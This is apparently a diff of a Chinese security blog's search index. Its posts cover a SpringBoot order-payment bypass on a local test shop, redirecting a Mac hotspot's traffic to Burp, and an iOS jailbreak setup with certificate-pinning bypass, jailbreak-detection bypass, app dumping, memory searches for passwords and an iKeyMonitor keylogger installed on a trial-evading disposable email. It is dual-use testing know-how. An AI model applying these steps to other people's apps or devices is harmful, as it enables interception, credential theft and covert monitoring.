-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>对于SQL注入的审计，在Mapper中搜寻是否存在<code>${}</code>拼接的情况，尤其注意order by、group by、like、in。找到拼接后再逆向追踪参数，判断参数是否可控，是否是字符类型，检查是否存在过滤器过滤SQL字符。</p>
-<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://mybatis.org/mybatis-3/zh/sqlmap-xml.html#select" target="_blank" rel="noopener">https://mybatis.org/mybatis-3/zh/sqlmap-xml.html#select</a></p>
-<p><a href="https://segmentfault.com/a/1190000004617028" target="_blank" rel="noopener">https://segmentfault.com/a/1190000004617028</a></p>
-<p><a href="https://c0d3p1ut0s.github.io/MyBatis框架中常见的SQL注入/" target="_blank" rel="noopener">https://c0d3p1ut0s.github.io/MyBatis%E6%A1%86%E6%9E%B6%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84SQL%E6%B3%A8%E5%85%A5/</a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>Java SpringBoot框架代码审计五 - 越权</title>
     <url>/2020/05/04/JavaSpringBootCodeAudit-5-IDOR/</url>
     <content><![CDATA[<p>越权分为三部分讲解：1. 未授权访问；2. 垂直越权；3. 水平越权</p>
@@ -861,29 +878,41 @@
 ]]></content>
   </entry>
   <entry>
-    <title>Java SpringBoot框架代码审计七 - 逻辑漏洞</title>
-    <url>/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/</url>
-    <content><![CDATA[<p>逻辑漏洞不像之前介绍的漏洞有一套固定的审计流程，每个逻辑漏洞背后的代码都不一样。通过纯白盒去找逻辑漏洞是比较费劲的，首先需要彻底了解业务，再带着各种疑问和奇怪的想法去审。</p>
+    <title>使用Packet Filter将Mac热点中的流量转发到Burp</title>
+    <url>/2020/04/02/Macbook_Hotspot_Proxy_to_Burp/</url>
+    <content><![CDATA[<p>一般情况下，Burp抓手机APP的HTTP/HTTPS请求时可在系统代理或者VPN代理软件上设置代理服务器，但是部分APP存在代理检测，发现存在代理则退出应用，或是部分APP的请求不通过代理。此时可利用Packet Filter将手机流量转发到Burp代理上，避免以上情况发生，从而抓到请求包。</p>
 <a id="more"></a>
 
-<h1 id="逻辑漏洞代码审计过程"><a href="#逻辑漏洞代码审计过程" class="headerlink" title="逻辑漏洞代码审计过程"></a>逻辑漏洞代码审计过程</h1><p>用户正常的购物过程是<code>添加购物车-&gt;下单-&gt;付款-&gt;出库-&gt;交易成功</code>，但程序在购物过程中没有对前一步进行校验。下订单但未支付时，访问<code>/orders/{orderNo}/finish</code>可直接完成交易。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// /src/main/java/ltd/newbee/mall/controller/mall/OrderController.java</span></span><br><span class="line"><span class="meta">@PutMapping</span>(<span class="string">"/orders/&#123;orderNo&#125;/finish"</span>)</span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Result <span class="title">finishOrder</span><span class="params">(@PathVariable(<span class="string">"orderNo"</span>)</span> String orderNo, HttpSession httpSession) </span>&#123;</span><br><span class="line">    NewBeeMallUserVO user = (NewBeeMallUserVO) httpSession.getAttribute(Constants.MALL_USER_SESSION_KEY);</span><br><span class="line">    String finishOrderResult = newBeeMallOrderService.finishOrder(orderNo, user.getUserId());</span><br><span class="line">    <span class="keyword">if</span> (ServiceResultEnum.SUCCESS.getResult().equals(finishOrderResult)) &#123;</span><br><span class="line">        <span class="keyword">return</span> ResultGenerator.genSuccessResult();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ResultGenerator.genFailResult(finishOrderResult);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>使用步骤：</p>
+<ol>
+<li>打开Macbook的网络共享，iPhone连接Macbook共享的网络（热点）。</li>
+<li>打开Burp，监听本地端口，并打开<code>Support invisible proxying</code>选项。</li>
+</ol>
+<img src="/2020/04/02/Macbook_Hotspot_Proxy_to_Burp/check-support-invisible-proxying.png" alt="check-support-invisible-proxying" style="zoom:35%;">
 
-<p>从代码中可以看到直接调用<code>newBeeMallOrderService.finishOrder(orderNo, user.getUserId())</code>，对于该订单是否支付，是否出库等过程都没有校验。</p>
-<h1 id="实际测试"><a href="#实际测试" class="headerlink" title="实际测试"></a>实际测试</h1><p>随便添加一件物品到购物车，提交订单</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/submit-order.png" alt="submit-order"></p>
-<p>此时来到订单详情页面，按正常逻辑来下一步是付款操作</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/pay-order.png" alt="pay-order"></p>
-<p>在管理页面确认该订单当前状态是待支付</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/wait-for-payment.png" alt="wait-for-payment"></p>
-<p>使用PUT方法访问<code>http://localhost:8089/orders/15886680589866584/finish</code>即可直接完成订单</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/bypass-pay-order.png" alt="bypass-pay-order"></p>
-<p>因为代码使用的是<code>@PutMapping</code>，所以只能使用PUT方法访问，其他请求方法不会被执行</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/finishOrder.png" alt="finishOrder"></p>
-<p>再次查看订单，已经交易成功</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/paid-success.png" alt="paid-success"></p>
-<p>在管理页面查看该订单，证明交易成功。</p>
-<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/show-orders.png" alt="show-orders"></p>
+<ol start="3">
+<li><p>开启转发功能：<code>sudo sysctl -w net.inet.ip.forwarding=1</code></p>
+</li>
+<li><p>添加<code>/etc/pf.anchors/proxy.rules</code>文件，内容如下：</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rdr pass on bridge100 inet proto tcp from any to any -&gt; 127.0.0.1 port 8080</span><br><span class="line"></span><br><span class="line"># rdr pass on bridge100 inet proto tcp from any to any port 80 -&gt; 127.0.0.1 port 8080</span><br><span class="line"># rdr pass on bridge100 inet proto tcp from any to any port 443 -&gt; 127.0.0.1 port 8080</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>添加<code>/etc/pf-minor.conf</code>文件，内容如下：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rdr-anchor &quot;forwarding&quot;</span><br><span class="line">load anchor &quot;forwarding&quot; from &quot;&#x2F;etc&#x2F;pf.anchors&#x2F;proxy.rules&quot;</span><br></pre></td></tr></table></figure>
+
+<ol start="6">
+<li>执行：<code>sudo pfctl -evf /etc/pf-minor.conf</code></li>
+</ol>
+<img src="/2020/04/02/Macbook_Hotspot_Proxy_to_Burp/pfctl.png" alt="pfctl" style="zoom:40%;">
+
+
+
+<p>⚠️：还原设定时只需执行：<code>sudo pfctl -evf /etc/pf.conf</code>，并且重启热点</p>
+<p><code>sudo pfctl -d</code>关闭packet filter</p>
+<p>总结：本质上是通过防火墙将某张网卡的流量转发到Burp。在Linux和Windows操作系统中配合防火墙进行流量转发能得到同样的效果。</p>
 ]]></content>
   </entry>
   <entry>
@@ -938,44 +967,6 @@
 <p><a href="https://blog.csdn.net/junmoxi/article/details/89208311" target="_blank" rel="noopener">https://blog.csdn.net/junmoxi/article/details/89208311</a></p>
 <p><a href="https://www.cnblogs.com/volcano-liu/p/11301057.html" target="_blank" rel="noopener">https://www.cnblogs.com/volcano-liu/p/11301057.html</a></p>
 <p><a href="https://stackoverflow.com/questions/42998367/same-site-cookie-in-spring-security/43250133#43250133" target="_blank" rel="noopener">https://stackoverflow.com/questions/42998367/same-site-cookie-in-spring-security/43250133#43250133</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>使用Packet Filter将Mac热点中的流量转发到Burp</title>
-    <url>/2020/04/02/Macbook_Hotspot_Proxy_to_Burp/</url>
-    <content><![CDATA[<p>一般情况下，Burp抓手机APP的HTTP/HTTPS请求时可在系统代理或者VPN代理软件上设置代理服务器，但是部分APP存在代理检测，发现存在代理则退出应用，或是部分APP的请求不通过代理。此时可利用Packet Filter将手机流量转发到Burp代理上，避免以上情况发生，从而抓到请求包。</p>
-<a id="more"></a>
-
-<p>使用步骤：</p>
-<ol>
-<li>打开Macbook的网络共享，iPhone连接Macbook共享的网络（热点）。</li>
-<li>打开Burp，监听本地端口，并打开<code>Support invisible proxying</code>选项。</li>
-</ol>
-<img src="/2020/04/02/Macbook_Hotspot_Proxy_to_Burp/check-support-invisible-proxying.png" alt="check-support-invisible-proxying" style="zoom:35%;">
-
-<ol start="3">
-<li><p>开启转发功能：<code>sudo sysctl -w net.inet.ip.forwarding=1</code></p>
-</li>
-<li><p>添加<code>/etc/pf.anchors/proxy.rules</code>文件，内容如下：</p>
-</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rdr pass on bridge100 inet proto tcp from any to any -&gt; 127.0.0.1 port 8080</span><br><span class="line"></span><br><span class="line"># rdr pass on bridge100 inet proto tcp from any to any port 80 -&gt; 127.0.0.1 port 8080</span><br><span class="line"># rdr pass on bridge100 inet proto tcp from any to any port 443 -&gt; 127.0.0.1 port 8080</span><br></pre></td></tr></table></figure>
-
-<ol start="5">
-<li>添加<code>/etc/pf-minor.conf</code>文件，内容如下：</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rdr-anchor &quot;forwarding&quot;</span><br><span class="line">load anchor &quot;forwarding&quot; from &quot;&#x2F;etc&#x2F;pf.anchors&#x2F;proxy.rules&quot;</span><br></pre></td></tr></table></figure>
-
-<ol start="6">
-<li>执行：<code>sudo pfctl -evf /etc/pf-minor.conf</code></li>
-</ol>
-<img src="/2020/04/02/Macbook_Hotspot_Proxy_to_Burp/pfctl.png" alt="pfctl" style="zoom:40%;">
-
-
-
-<p>⚠️：还原设定时只需执行：<code>sudo pfctl -evf /etc/pf.conf</code>，并且重启热点</p>
-<p><code>sudo pfctl -d</code>关闭packet filter</p>
-<p>总结：本质上是通过防火墙将某张网卡的流量转发到Burp。在Linux和Windows操作系统中配合防火墙进行流量转发能得到同样的效果。</p>
 ]]></content>
   </entry>
   <entry>
@@ -1057,6 +1048,32 @@
 </ol>
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://o2platform.files.wordpress.com/2011/07/ounce_springframework_vulnerabilities.pdf" target="_blank" rel="noopener">https://o2platform.files.wordpress.com/2011/07/ounce_springframework_vulnerabilities.pdf</a></p>
 <p><a href="http://johnis.online/old/2018/09/18/spring-view-injection/" target="_blank" rel="noopener">http://johnis.online/old/2018/09/18/spring-view-injection/</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Java SpringBoot框架代码审计七 - 逻辑漏洞</title>
+    <url>/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/</url>
+    <content><![CDATA[<p>逻辑漏洞不像之前介绍的漏洞有一套固定的审计流程，每个逻辑漏洞背后的代码都不一样。通过纯白盒去找逻辑漏洞是比较费劲的，首先需要彻底了解业务，再带着各种疑问和奇怪的想法去审。</p>
+<a id="more"></a>
+
+<h1 id="逻辑漏洞代码审计过程"><a href="#逻辑漏洞代码审计过程" class="headerlink" title="逻辑漏洞代码审计过程"></a>逻辑漏洞代码审计过程</h1><p>用户正常的购物过程是<code>添加购物车-&gt;下单-&gt;付款-&gt;出库-&gt;交易成功</code>，但程序在购物过程中没有对前一步进行校验。下订单但未支付时，访问<code>/orders/{orderNo}/finish</code>可直接完成交易。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// /src/main/java/ltd/newbee/mall/controller/mall/OrderController.java</span></span><br><span class="line"><span class="meta">@PutMapping</span>(<span class="string">"/orders/&#123;orderNo&#125;/finish"</span>)</span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Result <span class="title">finishOrder</span><span class="params">(@PathVariable(<span class="string">"orderNo"</span>)</span> String orderNo, HttpSession httpSession) </span>&#123;</span><br><span class="line">    NewBeeMallUserVO user = (NewBeeMallUserVO) httpSession.getAttribute(Constants.MALL_USER_SESSION_KEY);</span><br><span class="line">    String finishOrderResult = newBeeMallOrderService.finishOrder(orderNo, user.getUserId());</span><br><span class="line">    <span class="keyword">if</span> (ServiceResultEnum.SUCCESS.getResult().equals(finishOrderResult)) &#123;</span><br><span class="line">        <span class="keyword">return</span> ResultGenerator.genSuccessResult();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ResultGenerator.genFailResult(finishOrderResult);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从代码中可以看到直接调用<code>newBeeMallOrderService.finishOrder(orderNo, user.getUserId())</code>，对于该订单是否支付，是否出库等过程都没有校验。</p>
+<h1 id="实际测试"><a href="#实际测试" class="headerlink" title="实际测试"></a>实际测试</h1><p>随便添加一件物品到购物车，提交订单</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/submit-order.png" alt="submit-order"></p>
+<p>此时来到订单详情页面，按正常逻辑来下一步是付款操作</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/pay-order.png" alt="pay-order"></p>
+<p>在管理页面确认该订单当前状态是待支付</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/wait-for-payment.png" alt="wait-for-payment"></p>
+<p>使用PUT方法访问<code>http://localhost:8089/orders/15886680589866584/finish</code>即可直接完成订单</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/bypass-pay-order.png" alt="bypass-pay-order"></p>
+<p>因为代码使用的是<code>@PutMapping</code>，所以只能使用PUT方法访问，其他请求方法不会被执行</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/finishOrder.png" alt="finishOrder"></p>
+<p>再次查看订单，已经交易成功</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/paid-success.png" alt="paid-success"></p>
+<p>在管理页面查看该订单，证明交易成功。</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/show-orders.png" alt="show-orders"></p>
 ]]></content>
   </entry>
   <entry>
@@ -1177,6 +1194,124 @@
 
 <p>在maven中添加</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.11<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.11<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.11<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
+  </entry>
+  <entry>
+    <title>iOS 12.4越狱+配置过程记录</title>
+    <url>/2020/03/31/iOS-jailbreak/</url>
+    <content><![CDATA[<h1 id="越狱"><a href="#越狱" class="headerlink" title="越狱"></a>越狱</h1><p>在 <a href="https://checkra.in/#release" target="_blank" rel="noopener">https://checkra.in/#release</a> 中下载，其中能越狱的设备有iPhone 5s – iPhone X, iOS 12.3 and up</p>
+<p>我的设备是iPhone SE(A9)，iOS版本12.4</p>
+<a id="more"></a>
+
+<img src="/2020/03/31/iOS-jailbreak/checkra1n-latest-release.png" alt="checkra1n-latest-release" style="zoom: 67%;">
+
+<p>下载完成后，将手机通过数据线连接Mac，运行checkra1n，点击start</p>
+<img src="/2020/03/31/iOS-jailbreak/run-checkra1n.png" alt="run-checkra1n" style="zoom:43%;">
+
+<p>一直点击next，直到如下画面，根据以下提示按键</p>
+<ol>
+<li>点击Start</li>
+<li>同时按住关机键和home键</li>
+<li>松开关机键，持续按住home键</li>
+</ol>
+<img src="/2020/03/31/iOS-jailbreak/checkra1n-start-jailbreak.png" alt="checkra1n-start-jailbreak" style="zoom: 43%;">
+
+<p>之后等待一会，程序安装完成之后，iPhone会重启。</p>
+<p>重启完成后输入密码，进行系统，点开checkra1n应用，安装Cydia。</p>
+<p>（安装Cydia最好翻墙，翻墙很快下完，不翻墙下载失败）</p>
+<img src="/2020/03/31/iOS-jailbreak/checkra1n-jailbreak-success.png" alt="checkra1n-jailbreak-success" style="zoom:33%;">
+
+<p>整个越狱流程就结束了，非常简单快捷。</p>
+<h1 id="iProxy"><a href="#iProxy" class="headerlink" title="iProxy"></a>iProxy</h1><p>安装完Cydia之后可以来安装iProxy。iProxy的用处是通过USB进行SSH连接手机，虽然Wi-Fi就能通过SSH连接，但是稳定性和传输速度比不上USB。</p>
+<p>在Mac上执行：<code>brew install libusbmuxd</code>，安装完成之后将手机的端口映射到其他端口上：<code>iproxy 2222 22</code>,在令一个终端页面输入<code>ssh root@localhost -p 2222</code>开始连接，密码是alpine。</p>
+<p>⚠️ 我连接SSH时出现问题，报错内容如下</p>
+<img src="/2020/03/31/iOS-jailbreak/iproxy-error.png" alt="iproxy-error" style="zoom:50%;">
+
+<p>我的解决办法就是重新安装openssh，重装后就能正常连接</p>
+<img src="/2020/03/31/iOS-jailbreak/iproxy-success.png" alt="iproxy-success" style="zoom:50%;">
+
+
+
+<h1 id="Frida-and-Objection"><a href="#Frida-and-Objection" class="headerlink" title="Frida and Objection"></a>Frida and Objection</h1><p>Frida安装教程：<a href="https://frida.re/docs/ios/" target="_blank" rel="noopener">https://frida.re/docs/ios/</a></p>
+<p>在Mac执行：<code>pip3 install frida-tools</code></p>
+<p>需要在iPhone上执行的操作：打开Cydia -&gt; 点击底部栏“软件源” -&gt; 点击右上角“编辑” -&gt; 点击左上角“添加”，然后输入 <a href="https://build.frida.re" target="_blank" rel="noopener">https://build.frida.re</a></p>
+<p>完成之后，点击新增的源找到“build.frida.re”点击进去，里面有三个可选项，分别是“Frida for 32-bit devices”、“Frida for A12+ devices”、“Frida for pre-A12 devices”，32-bit是iPhone 5s和iPad Air（不含）以下的设备，A12+是iPhone X（不含）以上的设备。</p>
+<p>因为我的设备是iPhone SE，芯片型号是A9，所以选择“Frida for pre-A12 devices”</p>
+<p>安装完Firda之后，继续安装Objection。</p>
+<p>在Mac上执行<code>pip3 install objection</code>，安装完成之后可以运行<code>objection --gadget &quot;com.apple.AppStore&quot; explore</code>来测试一下</p>
+<img src="/2020/03/31/iOS-jailbreak/objection-install.png" alt="objection-install" style="zoom:50%;">
+
+
+
+<p>⚠️ 如果安装的是“Frida for A12+ devices”，使用Frida时需要开启Xcode来挂载硬盘镜像。</p>
+<img src="/2020/03/31/iOS-jailbreak/objection-error.png" alt="objection-error" style="zoom:50%;">
+
+
+
+<h1 id="证书配置和安装SSL-Kill-Switch-2"><a href="#证书配置和安装SSL-Kill-Switch-2" class="headerlink" title="证书配置和安装SSL Kill Switch 2"></a>证书配置和安装SSL Kill Switch 2</h1><p>证书配置非常简单，设置好burp代理，访问 <a href="http://burp" target="_blank" rel="noopener">http://burp</a> ，安装证书。</p>
+<p>安装证书之后在 设置 -&gt; 通用 -&gt; 描述文件 -&gt; PortSwigger CA，点击安装。</p>
+<p>再到 通用 -&gt; 关于本机 -&gt; 证书信任设置，选上PortSwigger即可。</p>
+<img src="/2020/03/31/iOS-jailbreak/certificate-trust.png" alt="certificate-trust" style="zoom:33%;">
+
+
+
+<p>重点是安装SSL Killing，app测试时很多应用都会强制使用certificate pinning导致无法抓包，安装<a href="https://github.com/nabla-c0d3/ssl-kill-switch2" target="_blank" rel="noopener">SSL Kill Switch 2</a>可帮助我们绕过certificate pinning。</p>
+<ol>
+<li>安装前先确定Cydia中安装了以下packages：<code>wget</code>、<code>Debian Packager</code>、<code>Cydia Substrate</code>、<code>PreferenceLoader</code></li>
+</ol>
+<p>⚠️ 找不到PreferenceLoader，可添加源：<a href="https://rpetri.ch/repo" target="_blank" rel="noopener">https://rpetri.ch/repo</a> ，再安装。</p>
+<ol start="2">
+<li>在<a href="https://github.com/nabla-c0d3/ssl-kill-switch2/releases" target="_blank" rel="noopener">SSL Kill Switch 2 release</a>中复制最新的<code>.deb</code>链接</li>
+<li>使用SSH连接iPhone，运行<code>wget &lt;RELEASE URL FROM STEP 2&gt;</code> -&gt; <code>dpkg -i &lt;DOWNLOAD PACKAGE NAME&gt;</code> -&gt;killall -HUP SpringBoard，确定安装成功后<code>rm &lt;DOWNLOAD PACKAGE NAME&gt;</code></li>
+<li>打开iPhone，在设置 -&gt; SSL Kill Switch 2（设置的最下方） -&gt; 勾选Disable Certificate Validation</li>
+</ol>
+<img src="/2020/03/31/iOS-jailbreak/SSL-Kill-Switch.png" alt="SSL-Kill-Switch" style="zoom:33%;">
+
+
+
+<h1 id="绕过越狱检测"><a href="#绕过越狱检测" class="headerlink" title="绕过越狱检测"></a>绕过越狱检测</h1><h3 id="Liberty"><a href="#Liberty" class="headerlink" title="Liberty"></a>Liberty</h3><p>iPhone上打开Cydia，添加源<code>https://ryleyangus.com/repo/</code>，之后搜索<code>Liberty Lite</code>，安装即可。</p>
+<p>安装完成之后在设置中开启Liberty，再点击Block Jailbreak Detection中选择需要绕过越狱检测的iOS应用。</p>
+<img src="/2020/03/31/iOS-jailbreak/liberty.png" alt="liberty" style="zoom:33%;">
+
+<p>如果在某些APP中不生效，也可以尝试其他插件，比如xCon。</p>
+<h3 id="xCon"><a href="#xCon" class="headerlink" title="xCon"></a>xCon</h3><p>在Cydia中添加源 <a href="http://xcon.crazy.net/" target="_blank" rel="noopener">http://xcon.crazy.net</a> ，进入添加的源中选择xCon下载安装即可。</p>
+<p>xCon会绕过以下越狱检测方法（1）根据是否存在特定的越狱文件，及特定文件的权限是否发生变化来判断设备是否越狱（2）根据沙箱完整性检测设备是否越狱（3）根据文件系统的分区是否发生变化来检测设备是否越狱（4）根据是否安装ssh来判断设备是否越狱</p>
+<h1 id="导出APP文件"><a href="#导出APP文件" class="headerlink" title="导出APP文件"></a>导出APP文件</h1><p>导出APP是一个非常有用的功能，导出之后的文件没有壳，拖到IDA中直接反编译就行，非常方便，谁用谁知道。</p>
+<ol>
+<li>在Mac中输入<code>git clone https://github.com/AloneMonkey/frida-ios-dump.git &amp;&amp; cd frida-ios-dump</code></li>
+<li><code>sudo pip3 install -r requirements.txt --upgrade</code></li>
+<li>在另一个终端输入<code>iproxy 2222 22</code></li>
+<li><code>python3 dump.py -l</code>列举iPhone上所有的应用，<code>python3 ./dump.py &lt;APP DISPLAY NAME OR BUNDLE IDENTIFIER&gt;</code>导出APP文件。</li>
+</ol>
+<h1 id="安装Apple-File-Conduit-2"><a href="#安装Apple-File-Conduit-2" class="headerlink" title="安装Apple File Conduit 2"></a>安装Apple File Conduit 2</h1><p>iOS9以上无法通过第三方软件读取应用文件，安装Apple File Confuit2可绕过该限制。</p>
+<p>在Cydia中搜索“Apple File Confuit2”即可</p>
+<p>APP文件目录：    </p>
+<p>a) iOS7及之前：/Device/private/var/mobile/Application/UUID/XXXXX.app/</p>
+<p>b) iOS8：/var/mobile/Containers/Bundle/Application/UUID/</p>
+<p>c) iOS9/10/12：/var/containers/Bundle/Application/UUID/</p>
+<h1 id="添加mem-check"><a href="#添加mem-check" class="headerlink" title="添加mem-check"></a>添加mem-check</h1><p>已经安装好OpenSSH，可以使用sftp将mem-check文件上传到iPhone中。</p>
+<p>在本机输入<code>sftp -P 2222 root@localhost</code>，再输入密码<code>alpine</code>进入sftp模式</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~ sftp -P 2222 root@localhost</span><br><span class="line">root@localhost<span class="string">'s password: alpine</span></span><br><span class="line"><span class="string">Connected to localhost.</span></span><br></pre></td></tr></table></figure>
+
+<p>进入sftp模式后，使用put将文件上传至iPhone中，上传文件路径为本机的路径</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sftp&gt; put /Tmp/mem-check</span><br><span class="line">Uploading /Tmp/mem-check to /private/var/root/mem-check</span><br><span class="line">/Tmp/mem-check                                       100%  132KB   8.2MB/s   00:00</span><br><span class="line">sftp&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后给mem-check加上执行权限，</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod +x mem-check</span><br></pre></td></tr></table></figure>
+
+<p>先用ps命令得到APP的PID，再利用mem-check –p PID –s STRING对APP内存进行搜索</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">~ root<span class="comment"># ps A | grep XXX</span></span><br><span class="line">~ root<span class="comment"># mem-check -p 1234 -s password</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="iKeyMonitor安装"><a href="#iKeyMonitor安装" class="headerlink" title="iKeyMonitor安装"></a>iKeyMonitor安装</h1><p>iKeyMonitor安装直接在Cydia中搜索iKeyMonitor即可</p>
+<p>iKeymonitor只有三天试用时间，使用十分钟邮箱（<a href="http://mail.bccto.me/" target="_blank" rel="noopener">http://mail.bccto.me/</a> ）获取一个随机的邮箱，然后在官网进行注册（ <a href="https://ikeymonitor.com/" target="_blank" rel="noopener">https://ikeymonitor.com/</a> ）</p>
+<p>官网选择sign up -&gt; iPhone/iPad -&gt; The iPhone/iPad can be Jailbroken, and I can get it in my hand and jailbreak it -&gt; 填写User ID 和 Email</p>
+<p>然后会收到一封邮件，点击查看可得到许可证号，使用许可证登录即可</p>
+<p><img src="/2020/03/31/iOS-jailbreak/iKeyMonitor.png" alt="iKeyMonitor"></p>
+<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a href="https://spaceraccoon.dev/from-checkra1n-to-frida-ios-app-pentesting-quickstart-on-ios-13" target="_blank" rel="noopener">https://spaceraccoon.dev/from-checkra1n-to-frida-ios-app-pentesting-quickstart-on-ios-13</a></p>
+<p><a href="https://frida.re/docs/ios/" target="_blank" rel="noopener">https://frida.re/docs/ios/</a></p>
+<p><a href="https://github.com/sensepost/objection/wiki/Screenshots" target="_blank" rel="noopener">https://github.com/sensepost/objection/wiki/Screenshots</a></p>
+]]></content>
   </entry>
   <entry>
     <title>理解Java反序列化-ysoserial URLDNS</title>
@@ -1397,124 +1532,6 @@
 <blockquote>
 <p><strong>代码审计关键</strong>：关注<code>th:utext</code>，<code>th:utext</code>中的内容用户可控则存在XSS。</p>
 </blockquote>
-]]></content>
-  </entry>
-  <entry>
-    <title>iOS 12.4越狱+配置过程记录</title>
-    <url>/2020/03/31/iOS-jailbreak/</url>
-    <content><![CDATA[<h1 id="越狱"><a href="#越狱" class="headerlink" title="越狱"></a>越狱</h1><p>在 <a href="https://checkra.in/#release" target="_blank" rel="noopener">https://checkra.in/#release</a> 中下载，其中能越狱的设备有iPhone 5s – iPhone X, iOS 12.3 and up</p>
-<p>我的设备是iPhone SE(A9)，iOS版本12.4</p>
-<a id="more"></a>
-
-<img src="/2020/03/31/iOS-jailbreak/checkra1n-latest-release.png" alt="checkra1n-latest-release" style="zoom: 67%;">
-
-<p>下载完成后，将手机通过数据线连接Mac，运行checkra1n，点击start</p>
-<img src="/2020/03/31/iOS-jailbreak/run-checkra1n.png" alt="run-checkra1n" style="zoom:43%;">
-
-<p>一直点击next，直到如下画面，根据以下提示按键</p>
-<ol>
-<li>点击Start</li>
-<li>同时按住关机键和home键</li>
-<li>松开关机键，持续按住home键</li>
-</ol>
-<img src="/2020/03/31/iOS-jailbreak/checkra1n-start-jailbreak.png" alt="checkra1n-start-jailbreak" style="zoom: 43%;">
-
-<p>之后等待一会，程序安装完成之后，iPhone会重启。</p>
-<p>重启完成后输入密码，进行系统，点开checkra1n应用，安装Cydia。</p>
-<p>（安装Cydia最好翻墙，翻墙很快下完，不翻墙下载失败）</p>
-<img src="/2020/03/31/iOS-jailbreak/checkra1n-jailbreak-success.png" alt="checkra1n-jailbreak-success" style="zoom:33%;">
-
-<p>整个越狱流程就结束了，非常简单快捷。</p>
-<h1 id="iProxy"><a href="#iProxy" class="headerlink" title="iProxy"></a>iProxy</h1><p>安装完Cydia之后可以来安装iProxy。iProxy的用处是通过USB进行SSH连接手机，虽然Wi-Fi就能通过SSH连接，但是稳定性和传输速度比不上USB。</p>
-<p>在Mac上执行：<code>brew install libusbmuxd</code>，安装完成之后将手机的端口映射到其他端口上：<code>iproxy 2222 22</code>,在令一个终端页面输入<code>ssh root@localhost -p 2222</code>开始连接，密码是alpine。</p>
-<p>⚠️ 我连接SSH时出现问题，报错内容如下</p>
-<img src="/2020/03/31/iOS-jailbreak/iproxy-error.png" alt="iproxy-error" style="zoom:50%;">
-
-<p>我的解决办法就是重新安装openssh，重装后就能正常连接</p>
-<img src="/2020/03/31/iOS-jailbreak/iproxy-success.png" alt="iproxy-success" style="zoom:50%;">
-
-
-
-<h1 id="Frida-and-Objection"><a href="#Frida-and-Objection" class="headerlink" title="Frida and Objection"></a>Frida and Objection</h1><p>Frida安装教程：<a href="https://frida.re/docs/ios/" target="_blank" rel="noopener">https://frida.re/docs/ios/</a></p>
-<p>在Mac执行：<code>pip3 install frida-tools</code></p>
